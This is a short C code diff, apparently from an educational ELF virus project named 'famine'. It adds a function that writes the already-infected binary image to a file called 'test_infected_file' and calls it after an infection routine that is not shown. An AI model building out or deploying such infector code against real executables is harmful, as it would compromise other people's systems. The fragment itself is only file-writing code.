@@ -54,6 +54,21 @@ void get_binary_data(char *file_name, t_famine *famine)
     close(fd) == -1 ? error(ERROR_CLOSE, famine) : 0;
 }
 
+void write_famine_file(t_famine *famine)
+{
+    int fd;
+
+    if ((fd = open("test_infected_file", O_WRONLY | O_CREAT, S_IRWXU)) < 0)
+    {
+        error(ERROR_OPEN, famine);
+    }
+    if ((write(fd, famine->infected_file, famine->infected_file_size)) < 0)
+    {
+        close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_WRITE, famine);
+    }
+    close(fd) == -1 ? error(ERROR_CLOSE, famine) : 0;
+}
+
 int main(int ac, char **av)
 {
     t_famine *famine;
@@ -75,6 +90,7 @@ int main(int ac, char **av)
     famine->shdr = (t_elf_shdr *)((famine->mmap_ptr + famine->ehdr->e_shoff));
 
     choose_infection_method(famine);
+    write_famine_file(famine);
     free_famine(famine);
     return 0;
 }
